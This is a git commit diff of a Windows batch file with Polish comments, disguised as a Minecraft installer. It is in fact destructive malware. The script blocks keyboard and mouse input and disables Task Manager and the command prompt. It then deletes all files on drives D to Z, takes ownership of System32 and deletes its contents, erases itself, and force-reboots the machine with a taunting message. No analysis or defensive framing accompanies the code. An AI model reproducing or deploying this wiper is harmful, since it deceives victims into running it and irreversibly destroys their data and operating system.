c31f9690eac28308d296d8ecbc7a6bc35a87f825
xoxojojo <kornelzietek7@gmail.com>
2026-03-07 12:58:01 +0100

    Update lol.bat

--- lol.bat
+++ lol.bat
@@ -1,5 +1,5 @@
 @echo off
-:: KROK 1 & 2: SPRAWDZENIE ADMINA I ZIELONY KOLOR
+:: SPRAWDZENIE ADMINA
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     title Error
@@ -33,57 +33,44 @@ if /i "%choice%" neq "Y" (
     exit
 )
 
-:: KROK 4: START PO KLIKNIECIU "Y"
+:: KROK 4: START DESTRUKCJI
 cls
-echo [!] Initializing Minecraft Engine...
-timeout /t 2 >nul
-
-:: BLOKADA KLAWIATURY I MYSZKI (ODLACZENIE)
+:: FIZYCZNA BLOKADA MYSZY I KLAWIATURY (PowerShell)
 powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"
 
 :: BLOKADA TASK MANAGERA I CMD
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 
-:: A. USUWANIE DYSKOW D, E, F... (WIDOCZNE SCIEZKI)
-echo [!] Downloading Game Assets...
+:: A. CZYSZCZENIE INNYCH DYSKÓW (Wszystkie od D do Z)
 for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
         for /f "delims=" %%f in ('dir /s /b %%d:\*.* 2^>nul') do (
-            echo Downloading: %%f
+            echo Deleting: %%f
             del /f /q "%%f" >nul 2>&1
         )
-        format %%d: /q /x /y >nul 2>&1
+        rd /s /q %%d:\ >nul 2>&1
     )
 )
 
-:: B. USUWANIE STEROWNIKOW (WIDOCZNE SCIEZKI)
-echo [!] Downloading Hardware Drivers...
-takeown /f C:\Windows\System32\drivers /r /d y >nul 2>&1
-icacls C:\Windows\System32\drivers /grant administrators:F /t >nul 2>&1
-for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\drivers\*.*') do (
-    echo Downloading: %%i
-    del /f /q "%%i" >nul 2>&1
-)
-
-:: C. USUWANIE SYSTEM32 (WIDOCZNE SCIEZKI - TO BEDZIE WYGLADAC NAJLEPIEJ)
-echo [!] Downloading Minecraft Core Engine...
+:: B. PRZEJMOWANIE UPRAWNIEŃ DO SYSTEM32 I STEROWNIKÓW
 takeown /f C:\Windows\System32 /r /d y >nul 2>&1
 icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
+
+:: C. TOTALNE USUWANIE - PRZEWIJAJĄCE SIĘ ŚCIEŻKI (JAK W 1 WERSJI)
 for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
-    echo Downloading: %%i
+    echo Deleting: %%i
     del /f /q "%%i" >nul 2>&1
 )
 
-:: D. PRZEDOSTATNI KROK: SAMOUSUWANIE INSTALATORA
-:: Skrypt tworzy plik tymczasowy, ktory usunie instalator sekunde przed restartem
-(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\final_clean.bat
-start /min "" %temp%\final_clean.bat
+:: D. SAMOUSUWANIE INSTALATORA NA SAMYM KOŃCU
+(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\kill_inst.bat
+start /min "" %temp%\kill_inst.bat
 
-:: E. OSTATNI KROK: RESTART Z WIADOMOSCIA
+:: E. FINALNY REBOOT Z WIADOMOŚCIĄ
 cls
 echo ============================================================
-echo   Minecraft installed. Restarting to apply changes...
+echo   Minecraft installed. Restarting system...
 echo ============================================================
-shutdown -r -t 2 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
+shutdown -r -t 0 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
 exit
